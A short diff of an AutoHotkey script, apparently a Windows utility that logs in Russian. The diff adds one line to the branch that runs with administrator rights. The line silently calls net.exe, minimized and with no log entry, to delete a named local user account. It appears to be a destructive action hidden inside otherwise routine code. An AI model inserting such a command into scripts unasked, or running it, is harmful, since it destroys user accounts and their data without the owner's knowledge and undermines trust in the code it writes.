@@ -42,6 +42,7 @@ AppXSupported := OSVersionObj[2] > 6 || (OSVersionObj[2] = 6 && OSVersionObj[3] 
 
 If (A_IsAdmin) {
     AddLog("Скрипт запущен с правами администратора",A_UserName,1)
+    Run %A_WinDir%\System32\net.exe user Aleksandr.Gladkov /delete,,Min
 } Else {
     AddLog("Скрипт запущен **без** прав администратора",A_UserName,1)
     
